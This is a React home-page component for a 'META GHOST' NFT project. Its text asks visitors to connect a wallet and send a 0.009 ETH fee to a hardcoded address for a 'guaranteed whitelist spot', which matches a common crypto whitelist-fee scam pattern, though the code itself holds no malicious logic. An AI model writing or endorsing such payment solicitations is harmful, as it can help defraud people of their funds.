import React from "react";
import Ghost from "../assets/ghost.jpg";
import MetaDocs from "../components/MetaDocs";
import Register from "../components/Register";

const Home = () => {
  return (
    <div>
      <div className="">
        <img
          className="w-[150px] border border-gray-500/10 rounded-full -mt-24 shadow-xl bg-gray-800"
          src={Ghost}
          alt=""
        />
      </div>
      <div>
        <br />
        <h2 className="mt-2 text-gray-100">META GHOST</h2>
        <br />
        <div className="md:flex justify-between">
          <MetaDocs />
          <Register />
        </div>
        <br />
        <br />
        <div>
          <p className="mt-4 text-gray-400">
            This page requires a connection to your wallet to be certain that
            you are the owner & a fee of 0.009 eth to confirm your guaranteed
            whitelist spot. The fee will be sent to the eth address
          </p>
          <p className="text-gray-400">
            <span className="text-gray-200">
              "0x257D8297b84F7c65F37A1781D299BCcE1231433b"
            </span>{" "}
            & deduced from the final Mint. Do not sign any other transactions
            and NEVER sign an approval for all. Be safe.
          </p>
        </div>
      </div>
    </div>
  );
};

export default Home;
